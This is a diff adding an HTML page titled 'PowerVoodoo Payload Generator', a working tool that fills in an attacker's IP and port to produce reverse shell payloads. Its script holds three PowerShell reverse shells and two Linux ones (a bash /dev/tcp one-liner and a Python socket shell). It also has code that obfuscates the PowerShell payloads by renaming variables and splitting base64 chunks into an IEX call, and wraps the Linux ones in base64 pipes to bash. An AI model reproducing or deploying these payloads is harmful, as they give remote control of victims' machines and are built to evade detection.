@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PowerVoodoo Payload Generator</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #121212;
+            color: #f0f0f0;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .container {
+            background-color: #1e1e1e;
+            border-radius: 5px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+        
+        h1 {
+            color: #ffcc00;
+            text-align: center;
+            border-bottom: 1px solid #ffcc00;
+            padding-bottom: 10px;
+        }
+        
+        .section {
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: #252525;
+            border-radius: 5px;
+        }
+        
+        .section-title {
+            color: #ffcc00;
+            margin-top: 0;
+        }
+        
+        code {
+            display: block;
+            background-color: #2d2d2d;
+            padding: 10px;
+            border-radius: 3px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            margin: 10px 0;
+            color: #f0f0f0;
+        }
+        
+        .mc { color: #ffcc00; }  /* Main color - yellow */
+        .sc { color: #ffffff; }  /* Secondary color - white */
+        .ec { color: #ff4444; }  /* Error color - red */
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ffcc00;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 8px;
+            background-color: #2d2d2d;
+            border: 1px solid #444;
+            border-radius: 3px;
+            color: #f0f0f0;
+        }
+        
+        button {
+            background-color: #ffcc00;
+            color: #121212;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+            display: block;
+            margin: 20px auto;
+        }
+        
+        button:hover {
+            background-color: #ffdd33;
+        }
+        
+        .payload-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .payload-option {
+            flex: 1;
+            min-width: 200px;
+            background-color: #2d2d2d;
+            padding: 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .payload-option:hover {
+            background-color: #3d3d3d;
+        }
+        
+        .payload-option h4 {
+            margin-top: 0;
+            color: #ffcc00;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>PowerVoodoo Payload Generator</h1>
+        
+        <div class="section">
+            <h2 class="section-title">Usage</h2>
+            <p>Generate reverse shell payloads for Windows or Linux targets.</p>
+            
+            <div class="form-group">
+                <label for="lhost">LHOST (Your IP address):</label>
+                <input type="text" id="lhost" placeholder="192.168.1.23">
+            </div>
+            
+            <div class="form-group">
+                <label for="lport">LPORT (Port to receive connection):</label>
+                <input type="text" id="lport" placeholder="4444">
+            </div>
+            
+            <div class="form-group">
+                <label for="os">Target OS:</label>
+                <select id="os">
+                    <option value="windows">Windows</option>
+                    <option value="linux">Linux</option>
+                </select>
+            </div>
+            
+            <button id="generateBtn">Generate Payloads</button>
+        </div>
+        
+        <div id="payloadSection" class="section hidden">
+            <h2 class="section-title">Generated Payloads</h2>
+            <div id="windowsPayloads">
+                <h3 class="mc">Windows Payloads</h3>
+                
+                <div class="payload-options">
+                    <div class="payload-option" onclick="showPayload('bare')">
+                        <h4 class="mc">Bare</h4>
+                        <p>Simple PowerShell payload</p>
+                    </div>
+                    <div class="payload-option" onclick="showPayload('shade')">
+                        <h4 class="mc">Shade</h4>
+                        <p>Advanced PowerShell payload</p>
+                    </div>
+                    <div class="payload-option" onclick="showPayload('specter')">
+                        <h4 class="mc">Specter</h4>
+                        <p>More advanced PowerShell payload</p>
+                    </div>
+                </div>
+                
+                <div id="barePayload" class="hidden">
+                    <h4 class="sc">Bare Payload</h4>
+                    <code id="bareCode"></code>
+                </div>
+                
+                <div id="shadePayload" class="hidden">
+                    <h4 class="sc">Shade Payload</h4>
+                    <code id="shadeCode"></code>
+                </div>
+                
+                <div id="specterPayload" class="hidden">
+                    <h4 class="sc">Specter Payload</h4>
+                    <code id="specterCode"></code>
+                </div>
+            </div>
+            
+            <div id="linuxPayloads" class="hidden">
+                <h3 class="mc">Linux Payloads</h3>
+                
+                <div class="payload-options">
+                    <div class="payload-option" onclick="showPayload('basic')">
+                        <h4 class="mc">Basic</h4>
+                        <p>Simple bash payload</p>
+                    </div>
+                    <div class="payload-option" onclick="showPayload('ghost')">
+                        <h4 class="mc">Ghost</h4>
+                        <p>Advanced bash payload</p>
+                    </div>
+                </div>
+                
+                <div id="basicPayload" class="hidden">
+                    <h4 class="sc">Basic Payload</h4>
+                    <code id="basicCode"></code>
+                </div>
+                
+                <div id="ghostPayload" class="hidden">
+                    <h4 class="sc">Ghost Payload</h4>
+                    <code id="ghostCode"></code>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Windows payload templates
+        const windowsTemplates = {
+            bare: `$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
+            
+            shade: `function Cleanup {
+                if ($client.Connected -eq $true) {$client.Close()}
+                if ($process.ExitCode -ne $null) {$process.Close()}
+                exit}
+                $address = 'LHOST'
+                $port = 'LPORT'
+                $client = New-Object System.Net.Sockets.TCPClient($address,$port)
+                $stream = $client.GetStream()
+                $networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+                $process = New-Object System.Diagnostics.Process
+                $process.StartInfo.FileName = 'cmd.exe'
+                $process.StartInfo.RedirectStandardInput = 1
+                $process.StartInfo.RedirectStandardOutput = 1
+                $process.StartInfo.UseShellExecute = 0
+                $process.Start()
+                $inputstream = $process.StandardInput
+                $outputstream = $process.StandardOutput
+                Start-Sleep 1
+                $encoding = new-object System.Text.AsciiEncoding
+                while($outputstream.Peek() -ne -1){
+                    $out += $encoding.GetString($outputstream.Read())
+                }
+                $stream.Write($encoding.GetBytes($out),0,$out.Length)
+                $out = $null; $done = $false; $testing = 0;
+                while (-not $done) {
+                    if ($client.Connected -ne $true) {cleanup}
+                    $pos = 0; $i = 1
+                    while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+                        $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+                        $pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}
+                    }
+                    if ($pos -gt 0) {
+                        $string = $encoding.GetString($networkbuffer,0,$pos)
+                        $inputstream.write($string)
+                        start-sleep 1
+                        if ($process.ExitCode -ne $null) {Cleanup}
+                        else {
+                            $out = $encoding.GetString($outputstream.Read())
+                            while($outputstream.Peek() -ne -1){
+                                $out += $encoding.GetString($outputstream.Read())
+                                if ($out -eq $string) {$out = ''}
+                            }
+                            $stream.Write($encoding.GetBytes($out),0,$out.length)
+                            $out = $null
+                            $string = $null
+                        }
+                    } else {Cleanup}
+                }`,
+                
+            specter: `$socket = New-Object System.Net.Sockets.TcpClient('LHOST', LPORT);
+                if($socket -eq $null){exit 1}
+                $stream = $socket.GetStream();
+                $writer = New-Object System.IO.StreamWriter($stream);
+                $buffer = New-Object System.Byte[] 1024;
+                $encoding = New-Object System.Text.AsciiEncoding;
+                $writer.AutoFlush = $true;
+                while($true){
+                    while($stream.DataAvailable){
+                        $read = $stream.Read($buffer, 0, 1024);
+                        $data = $encoding.GetString($buffer, 0, $read);
+                        $exec = [System.Text.Encoding]::ASCII.GetString((Invoke-Expression -Command $data | Out-String));
+                        $writer.WriteLine($exec);
+                    }
+                    if($socket.Connected -ne $true -or $socket -eq $null){break;}
+                    Start-Sleep -Milliseconds 500;
+                }
+                $writer.Close();
+                $stream.Close();
+                $socket.Close();`
+        };
+
+        // Linux payload templates
+        const linuxTemplates = {
+            basic: `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`,
+            
+            ghost: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+        };
+
+        // Obfuscate PowerShell payload
+        function obfuscatePowerShell(payload) {
+            // Find all variable names
+            const vars = [...new Set(payload.match(/\$[a-zA-Z_][a-zA-Z0-9_]*/g))];
+            
+            // Replace each variable with a random 3-letter name
+            const replacements = {};
+            vars.forEach(v => {
+                if (!replacements[v]) {
+                    replacements[v] = '$' + Math.random().toString(36).substring(2, 5);
+                }
+            });
+            
+            let obfuscated = payload;
+            for (const [original, replacement] of Object.entries(replacements)) {
+                const regex = new RegExp(original.replace(/\$/g, '\\$'), 'g');
+                obfuscated = obfuscated.replace(regex, replacement);
+            }
+            
+            // Base64 encode the payload
+            const utf16le = encodeToUTF16LE(obfuscated);
+            const base64 = btoa(String.fromCharCode(...new Uint8Array(utf16le)));
+            
+            // Split into parts
+            const partLength = 6;
+            let parts = [];
+            for (let i = 0; i < base64.length; i += partLength) {
+                const part = base64.substring(i, i + partLength);
+                parts.push(`'${part}'`);
+            }
+            
+            return `IEX([system.text.encoding]::unicode.getstring([convert]::frombase64string(${parts.join(' + ')})))`;
+        }
+        
+        // Helper function to encode string to UTF-16LE
+        function encodeToUTF16LE(str) {
+            const buffer = new ArrayBuffer(str.length * 2);
+            const view = new Uint16Array(buffer);
+            for (let i = 0; i < str.length; i++) {
+                view[i] = str.charCodeAt(i);
+            }
+            return new Uint8Array(buffer);
+        }
+        
+        // Generate payloads based on user input
+        function generatePayloads() {
+            const lhost = document.getElementById('lhost').value;
+            const lport = document.getElementById('lport').value;
+            const os = document.getElementById('os').value;
+            
+            if (!lhost || !lport) {
+                alert('Please enter both LHOST and LPORT');
+                return;
+            }
+            
+            if (os === 'windows') {
+                // Generate Windows payloads
+                const bare = windowsTemplates.bare.replace(/LHOST/g, lhost).replace(/LPORT/g, lport);
+                const shade = windowsTemplates.shade.replace(/LHOST/g, lhost).replace(/LPORT/g, lport);
+                const specter = windowsTemplates.specter.replace(/LHOST/g, lhost).replace(/LPORT/g, lport);
+                
+                // Obfuscate payloads
+                document.getElementById('bareCode').textContent = obfuscatePowerShell(bare);
+                document.getElementById('shadeCode').textContent = obfuscatePowerShell(shade);
+                document.getElementById('specterCode').textContent = obfuscatePowerShell(specter);
+                
+                // Show Windows payloads
+                document.getElementById('windowsPayloads').classList.remove('hidden');
+                document.getElementById('linuxPayloads').classList.add('hidden');
+                
+            } else if (os === 'linux') {
+                // Generate Linux payloads
+                const basic = linuxTemplates.basic.replace(/LHOST/g, lhost).replace(/LPORT/g, lport);
+                const ghost = linuxTemplates.ghost.replace(/LHOST/g, lhost).replace(/LPORT/g, lport);
+                
+                // Base64 encode and wrap
+                const basicEncoded = `echo '${btoa(basic)}' | base64 -d | bash`;
+                const ghostEncoded = `echo '${btoa(ghost)}' | base64 -d | bash`;
+                
+                document.getElementById('basicCode').textContent = basicEncoded;
+                document.getElementById('ghostCode').textContent = ghostEncoded;
+                
+                // Show Linux payloads
+                document.getElementById('linuxPayloads').classList.remove('hidden');
+                document.getElementById('windowsPayloads').classList.add('hidden');
+            }
+            
+            // Show payload section
+            document.getElementById('payloadSection').classList.remove('hidden');
+        }
+        
+        // Show the selected payload
+        function showPayload(type) {
+            // Hide all payload displays first
+            document.querySelectorAll('#payloadSection div[id$="Payload"]').forEach(el => {
+                el.classList.add('hidden');
+            });
+            
+            // Show the selected one
+            document.getElementById(`${type}Payload`).classList.remove('hidden');
+        }
+        
+        // Event listeners
+        document.getElementById('generateBtn').addEventListener('click', generatePayloads);
+    </script>
+</body>
+</html>
